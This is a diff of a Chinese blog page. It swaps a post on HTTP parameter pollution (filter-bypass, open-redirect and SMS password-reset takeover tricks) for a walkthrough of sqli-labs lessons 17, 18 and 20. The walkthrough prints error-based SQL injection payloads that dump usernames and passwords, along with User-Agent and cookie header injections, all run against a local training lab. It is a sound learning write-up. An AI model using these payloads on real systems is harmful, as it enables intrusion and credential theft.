@@ -17,33 +17,64 @@
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
   
-  <title>HTTP参数污染 - 无言の小屋</title>
+  <title>sqli-labs - 无言の小屋</title>
 
   
-    <meta name="description" content="HTTP参数污染 在刷sqli-labs 29时遇到了http参数污染，就想着趁火打劫来学习一下 HTTP Parameter Pollution，简称HPP，是一种注入型漏洞，如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击，通过 HPP 参数污染可以实现绕过 waf 来进行攻击  漏洞原理 浏览器与服务器进行交互时，浏览器提交 GET&#x2F;POST 请求参数，这些参">
+    <meta name="description" content="sqli-labs  Less-17 基于报错注入的加强版  测试注入点时发现无论如何都没反应，只出现上图情况，当用户名为‘ admin ’或‘ Dumb ’时任意密码登录  发现密码会被更新 既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合  发现确实为&#39;闭合 用报错注入查库，查表，查列，查数据  但是当要查表时出现下述问题  pa">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTTP参数污染">
-<meta property="og:url" content="https://ikunmma.github.io/2025/07/21/HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:title" content="sqli-labs">
+<meta property="og:url" content="https://ikunmma.github.io/2025/07/28/sqli-labs/index.html">
 <meta property="og:site_name" content="无言の小屋">
-<meta property="og:description" content="HTTP参数污染 在刷sqli-labs 29时遇到了http参数污染，就想着趁火打劫来学习一下 HTTP Parameter Pollution，简称HPP，是一种注入型漏洞，如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击，通过 HPP 参数污染可以实现绕过 waf 来进行攻击  漏洞原理 浏览器与服务器进行交互时，浏览器提交 GET&#x2F;POST 请求参数，这些参">
+<meta property="og:description" content="sqli-labs  Less-17 基于报错注入的加强版  测试注入点时发现无论如何都没反应，只出现上图情况，当用户名为‘ admin ’或‘ Dumb ’时任意密码登录  发现密码会被更新 既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合  发现确实为&#39;闭合 用报错注入查库，查表，查列，查数据  但是当要查表时出现下述问题  pa">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721202204255.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721202214629.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721201941128.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224639295.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224533639.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721224657633.png">
-<meta property="article:published_time" content="2025-07-21T14:49:56.174Z">
-<meta property="article:modified_time" content="2025-07-21T14:49:35.510Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716171936765.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716172309503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716172513376.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716174243669.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716174606933.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716175733060.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716175916241.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716204833493.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716180304558.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717100936499.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101217503.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101542527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101659851.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717102020139.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717103130214.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717105819315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110047550.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110451708.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110530606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718095943381.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718100037954.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718100819514.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718101146132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718114338748.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718161608614.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250718162514618.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114627832.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114553137.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719112116232.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719114743003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719143251733.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719144519595.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719144540863.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719162311304.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250719162329342.png">
+<meta property="article:published_time" content="2025-07-28T13:17:00.852Z">
+<meta property="article:modified_time" content="2025-07-28T13:17:46.626Z">
 <meta property="article:author" content="Hackun">
 <meta property="article:tag" content="漏洞">
-<meta property="article:tag" content="HTTP">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721202204255.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716171936765.png">
   
   
   
-  <meta name="keywords" content="漏洞,HTTP">
+  <meta name="keywords" content="漏洞,SQL,CTF,靶场">
 
   <!-- feed -->
   
@@ -87,62 +118,149 @@
 <div class="article banner top">
   <div class="content">
     <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%BC%8F%E6%B4%9E/">漏洞</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E6%BC%8F%E6%B4%9E/HTTP/">HTTP</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-21T14:49:56.174Z">2025-07-21</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-21T14:49:35.510Z">2025-07-21</time></span></div></div></div>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/CTF/%E9%9D%B6%E5%9C%BA/">靶场</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2025-07-28T13:17:00.852Z">2025-07-28</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2025-07-28T13:17:46.626Z">2025-07-28</time></span></div></div></div>
     
     <div class="bottom only-title">
       
       <div class="text-area">
-        <h1 class="text title"><span>HTTP参数污染</span></h1>
+        <h1 class="text title"><span>sqli-labs</span></h1>
         
       </div>
     </div>
     
   </div>
-  </div><article class="md-text content"><h1 id="http参数污染"><a class="markdownIt-Anchor" href="#http参数污染"></a> HTTP参数污染</h1>
-<p>在刷sqli-labs 29时遇到了http参数污染，就想着趁火打劫来学习一下</p>
-<p><code>HTTP Parameter Pollution</code>，简称HPP，是一种注入型漏洞，如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击，通过 HPP 参数污染可以实现绕过 waf 来进行攻击</p>
-<h2 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h2>
-<p>浏览器与服务器进行交互时，浏览器提交 GET/POST 请求参数，这些参数会以 “名称-值对” 的形式出现。通常在一个请求中，同样名称的参数只会出现一次，但是在 <strong>HTTP 协议中是允许同样名称的参数出现多次的</strong></p>
-<p>但不同服务器处理方式会不一样</p>
-<p>如Goole和Bing的例子：</p>
-<p>Goole将两次输入的参数值进行拼接（未覆盖）</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721202204255.png" alt="" /></p>
-<p>Bing将第二次输入覆盖第一次输入</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721202214629.png" alt="屏幕截图 2025-07-21 200946" /></p>
-<h2 id="覆盖方式"><a class="markdownIt-Anchor" href="#覆盖方式"></a> 覆盖方式</h2>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250721201941128.png" alt="img" /></p>
-<h2 id="waf绕过"><a class="markdownIt-Anchor" href="#waf绕过"></a> WAF绕过</h2>
-<p>HPP其实严格意义上讲并不属于一种漏洞，它是利用了不同服务器对于参数获取的结果不同而导致了可以利用某些漏洞。HPP的特性让它在 WAF 绕过、逻辑漏洞挖掘上具有奇效</p>
-<h3 id="sql绕过"><a class="markdownIt-Anchor" href="#sql绕过"></a> SQL绕过</h3>
-<p>如：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1 union select 1,2,database()</span><br><span class="line">?id=-1&amp;id=%20union%20&amp;id=select%201,2&amp;id=,database()</span><br></pre></td></tr></table></figure>
-<h3 id="xss绕过待"><a class="markdownIt-Anchor" href="#xss绕过待"></a> XSS绕过（待）</h3>
-<h3 id="文件上传待"><a class="markdownIt-Anchor" href="#文件上传待"></a> 文件上传（待）</h3>
-<h3 id="逻辑漏洞"><a class="markdownIt-Anchor" href="#逻辑漏洞"></a> 逻辑漏洞</h3>
-<p>HPP 参数污染在逻辑漏洞挖掘中也是一个大杀器</p>
-<h4 id="任意url跳转"><a class="markdownIt-Anchor" href="#任意url跳转"></a> 任意URL跳转</h4>
-<p><code>https://www.example.com?u=https://hackun.com</code> ，由于后端做了限制，当我们把<code>u</code> 改成别的不同源的域名(如<code>https://ikunmma.com</code>)时会报错，但是我们可以利用HPP，将请求地址变成<code>https://www.example.com?u=https://hackun.com&amp;u=https://ikunmma.com</code> 时，由于服务器逻辑错误<br />
-使用第一个<code>u</code>做校验参数，而第二个<code>u</code>参数做跳转目的地址。于是这样便可成功绕过限制，形成任意 URL 跳转</p>
-<h4 id="任意密码重置短信爆破"><a class="markdownIt-Anchor" href="#任意密码重置短信爆破"></a> 任意密码重置（短信爆破）</h4>
-<p>一般重置密码的时候，会发送短信到用户手机<br />
-比如GET/POST传递的参数为：<code>phone=13888888888</code><br />
-我们一般会去想，能不能发送验证码到自己的手机，于是可以构造成： <code>phone=13888888888,12345678901</code> 或者 <code>phone=13888888888;12345678901</code> 或者 <code>phone=&#123;13888888888,12345678901&#125;</code><br />
-等等一些情况，有时候能通过，但是有些时候会出现 号码不合法 的情况，此时便可以考虑利用 HPP —— <code>phone=13888888888&amp;phone=12345678901</code>，如果恰好服务器用第一个号码验证是否存在该用户，而使用第二个号码发送短信时，我们便可以接管该用户</p>
-<h2 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h2>
-<ol>
-<li>设备层面，让WAF或其他网关设备（比如IPS）在检查URL时，对同一个参数被多次赋值的情况进行特殊处理。由于HTTP协议允许相同参数在URL中多次出现，因此这种特殊处理需要注意避免误杀的情况；</li>
-<li>代码层面，编写WEB程序时，要通过合理的<code>$_GET</code>方法获取URL中的参数值，而尝试获取 Web服务器返回给程序的其他值时要慎重处理，结合其他漏洞的产生进行组合排查</li>
-</ol>
-<h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2>
-<h3 id="sqli-labs-29"><a class="markdownIt-Anchor" href="#sqli-labs-29"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-29/">sqli-labs 29</a></h3>
+  </div><article class="md-text content"><h1 id="sqli-labs"><a class="markdownIt-Anchor" href="#sqli-labs"></a> sqli-labs</h1>
+<h2 id="less-17"><a class="markdownIt-Anchor" href="#less-17"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-17/">Less-17</a></h2>
+<p>基于报错注入的加强版</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716171936765.png" alt="" /></p>
+<p>测试注入点时发现无论如何都没反应，只出现上图情况，当用户名为‘ admin ’或‘ Dumb ’时任意密码登录</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716172309503.png" alt="" /></p>
+<p>发现密码会被更新</p>
+<p>既然是修改密码，后端一定存在update语句，修改的是password，猜测传入的password存在引号闭合</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716172513376.png" alt="" /></p>
+<p>发现确实为<code>'</code>闭合</p>
+<p>用报错注入查库，查表，查列，查数据</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716174243669.png" alt="" /></p>
+<p>但是当要查表时出现下述问题</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716174606933.png" alt="" /></p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from users)),1) #</span></span><br></pre></td></tr></table></figure>
+<p>查了一下才知道<strong>mysql修改和查询不能是同一张表</strong></p>
+<p>所以我们可以引入一个临时表</p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and updatexml(1, concat(0x7e, (select group_concat(username,id,password) from (select username,id,password from users) as ikun limit 0,1)),1) #</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716175733060.png" alt="" /></p>
+<p>但是当我们用<code>limit 1,1</code>时，出现了问题，后来才意识到<code>group_concat</code>是将数据放到一行输出，不能与limit结合查询（只能查一行/部分）</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716175916241.png" alt="" /></p>
+<p>我们进而用<code>mid</code></p>
+<p>payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and updatexml(1, concat(0x7e, mid((select group_concat(username,id,password) from (select username,id,password from users) as ikun ),1,21)),1)#</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716204833493.png" alt="image-20250716204833369" /></p>
+<p>也可以用<code>concat_ws</code>代替<code>group_concat</code></p>
+<p>payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select concat_ws(&#x27;</span>:<span class="string">&#x27;,username,id,password) from (select username,id,password from users) as ikun limit 1,1)),1)#</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250716180304558.png" alt="" /></p>
+<h2 id="less18"><a class="markdownIt-Anchor" href="#less18"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-18/">Less18</a></h2>
+<p>基于user-agent的http头注入</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717100936499.png" alt="" /></p>
+<p>用admin登录看到user-agent的内容回显在页面中</p>
+<p>先尝试用<code>'</code>,出现报错信息，其包含ip和用户名（当然也有user-agent）</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101217503.png" alt="" /></p>
+<p>猜想在数据中的sql语句为：<code>INSEERT INTO table VALUES('User-Agent','Ip','Username')</code></p>
+<p>(当然我也是看了后端代码才知道的，因为缺乏经验哈哈哈)</p>
+<p>用<code>')</code>闭合</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101542527.png" alt="" /></p>
+<p>加个#，报错信息消失，说明为<code>')</code>闭合</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717101659851.png" alt="" /></p>
+<p>接下来我们尝试在User-Agent的位置进行注入测试，我们修改User-Agnet的值使其符合整个INSERT INTIO 的语法</p>
+<p>构造<code>1',1,1)#</code>形式进行报错注入</p>
+<p>payload1：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,1,extractvalue(0x0a,concat(0x0a,(select database()))))#</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717102020139.png" alt="" /></p>
+<p>也可以构造<code>'and ...and '#</code></p>
+<p>payload2:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select database()))) and &#x27;</span>#</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>解释一下上述paylaod</p>
+<p>插入语句中变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> extractvalue(...) <span class="keyword">and</span> <span class="string">&#x27;#&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这是一个合法的布尔表达式，MySQL会自动将它的最终值转换为·字符串插入到表中</p>
+<p><code>''</code>=true</p>
+<p><code>extractvalue(...)</code> 返回字符串（我们在乎的是它会抛出错误）</p>
+<p><code>’#'</code>=true（<code>#</code>不是起注释作用）</p>
+<p>最终变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> <span class="keyword">table</span> <span class="keyword">VALUES</span>(<span class="operator">&lt;</span>表达式结果<span class="operator">&gt;</span>, <span class="string">&#x27;Ip&#x27;</span>, <span class="string">&#x27;Username&#x27;</span>);</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717103130214.png" alt="" /></p>
+<h2 id="less20"><a class="markdownIt-Anchor" href="#less20"></a> <a target="_blank" rel="noopener" href="http://127.0.0.1:8900/Less-20">Less20</a></h2>
+<p>基于Cookie的http头注入</p>
+<p>用admin登录后出现以下界面</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717105819315.png" alt="" /></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie：uname<span class="operator">=</span>admin</span><br></pre></td></tr></table></figure>
+<p>Cookie这里存在注入点</p>
+<p>尝试用<code>'</code>进行闭合，出现语法报错，加#后页面正常，说明闭合方式为<code>'</code>,看到页面有3个可能的回显点，我先尝试一下联合查询注入</p>
+<p>先判断出有3列</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110047550.png" alt="" /></p>
+<p>再找出回显位</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110451708.png" alt="" /></p>
+<p>最后用正常方法即可得到数据</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250717110530606.png" alt="" /></p>
